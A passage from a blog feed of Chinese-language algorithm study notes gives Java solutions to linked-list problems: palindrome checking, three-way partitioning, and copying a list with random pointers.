class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 左程云 </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>左神算法0x02</title>
      <link href="/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x02/"/>
      <url>/2021/12/08/%E5%B7%A6%E7%A5%9E%E7%AE%97%E6%B3%950x02/</url>
      
        <content type="html"><![CDATA[<p>【链表，二叉树，树形DP，Morris遍历，图】</p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><blockquote><p>链表问题一定要考虑边界情况，避免出现null还继续引用next节点</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> next<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x01-判断回文"><a href="#0x01-判断回文" class="headerlink" title="0x01 判断回文"></a>0x01 判断回文</h3><p>给定单链表头结点head，判断一个链表是否为回文</p><blockquote><p>1-&gt;2-&gt;1 true</p><p>1-&gt;2-&gt;2-&gt;1 true</p></blockquote><h4 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h4><p>遍历单链表，压入栈，然后一个一个弹出，与单链表比对，额外空间复杂度O(n)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">!=</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>找到链表中间，然后开始压入栈，这样只需要一半空间，O(n/2)</p><p>那么怎么找到中间位置，利用快慢指针，即从头建立两个指针，一个每次走2步，一个每次走1步，当快指针走到结尾，那么满指针就走到中间了</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>slow<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token operator">!=</span>slow<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>同样利用快慢指针，慢指针到达中间时，将中间的这个节点的next指到null，然后原来的next的next指到这个中间的节点，依次逆序过来，完成之后，开始一一比对，这样的空间复杂度O(1)，不要忘记最后将右边一半恢复</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isPalindrome3</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> fast <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>fast<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 逆序</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> curNext<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>slow <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        curNext <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        slow<span class="token punctuation">.</span>next <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> slow<span class="token punctuation">;</span>        slow <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> tail <span class="token operator">=</span> par<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> res <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token comment">// 比较值</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token operator">&amp;&amp;</span>par<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">!=</span> par<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            res <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        par <span class="token operator">=</span> par<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 调整回来</span>    par <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>tail <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        curNext <span class="token operator">=</span> tail<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        tail<span class="token punctuation">.</span>next <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> tail<span class="token punctuation">;</span>        tail <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-链表的荷兰国旗问题"><a href="#0x02-链表的荷兰国旗问题" class="headerlink" title="0x02 链表的荷兰国旗问题"></a>0x02 链表的荷兰国旗问题</h3><p>将单链表按某值划分为左边小，中间相等，右边大的形式</p><h4 id="1-0-1"><a href="#1-0-1" class="headerlink" title="1.0"></a>1.0</h4><p>将链表放到辅助Node数组，于是变成了荷兰国旗问题，空间复杂度O(n)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lessEqualMore1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        len<span class="token operator">++</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    cur<span class="token operator">=</span>head<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> cur<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> lessArea <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> moreArea <span class="token operator">=</span> len<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>moreArea<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">&lt;</span> value<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">,</span> <span class="token operator">++</span>lessArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">></span> value<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>nodes<span class="token punctuation">,</span> i<span class="token punctuation">,</span> <span class="token operator">--</span>moreArea<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        nodes<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> nodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    nodes<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> nodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    arr<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-1"><a href="#2-0-1" class="headerlink" title="2.0"></a>2.0</h4><p>只需要六个变量，小于区域的头节点LH，尾节点LT，等于区域的头节点EH，尾节点ET，大于区域的头节点MH，尾节点MT，遍历单链表，第一次遇到小于的，就将LH和LT都指向它，第二次遇到小于的，就将LT的next指向它，然后LT指向它，其它区域同样，遍历完成之后，将SH、ST、EH、ET、MH、MT依次连接，同时注意空指针的情况，即有可能不存在小于区域，或者其它区域，导致没有next节点，如果不处理，则会报出异常</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lessEqualMore2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> LH <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> LT <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> EH <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> ET <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> MH <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> MT <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> temp <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>LH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> LH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> LT<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            LT <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">==</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>EH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> EH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> ET<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            ET <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>MH <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> MH <span class="token operator">=</span> cur<span class="token punctuation">;</span>            <span class="token keyword">else</span> MT<span class="token punctuation">.</span>next <span class="token operator">=</span> cur<span class="token punctuation">;</span>            MT <span class="token operator">=</span> cur<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>LT<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        LT<span class="token punctuation">.</span>next <span class="token operator">=</span> EH<span class="token punctuation">;</span>        ET <span class="token operator">=</span> <span class="token punctuation">(</span>ET <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>LT<span class="token operator">:</span>ET<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ET<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span> ET<span class="token punctuation">.</span>next <span class="token operator">=</span> MH<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>LH<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>LH<span class="token operator">:</span><span class="token punctuation">(</span>EH<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">?</span>EH<span class="token operator">:</span>MH<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-复制链表"><a href="#0x03-复制链表" class="headerlink" title="0x03 复制链表"></a>0x03 复制链表</h3><p>复制含有随机指针节点的链表</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> next<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> rand<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> data<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-0-2"><a href="#1-0-2" class="headerlink" title="1.0"></a>1.0</h4><p>使用哈希表，key为旧链表的节点，value为它的克隆节点，完成哈希表建立之后，遍历旧链表，节点的next即为节点对应value的next，rand同理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token class-name">CopyListWithRandom1</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">></span></span> hash <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hash<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>        hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">.</span>rand <span class="token operator">=</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>rand<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> hash<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-0-2"><a href="#2-0-2" class="headerlink" title="2.0"></a>2.0</h4><p>1-&gt;2-&gt;3</p><p>遍历链表，每个旧节点的next指向为该节点的克隆节点，结果即为1-&gt;1’-&gt;2-&gt;2’-&gt;3-&gt;3’</p><p>对于rand，如果1的rand指向3，那么1’的rand顺理成章指向1的rand的next，其它节点同理</p><p>对于next，只需要将该链表拆开即可完成</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token class-name">CopyListWithRandom2</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> curNext <span class="token operator">=</span> cur<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        cur<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next <span class="token operator">=</span> curNext<span class="token punctuation">;</span>        cur <span class="token operator">=</span> curNext<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span><span 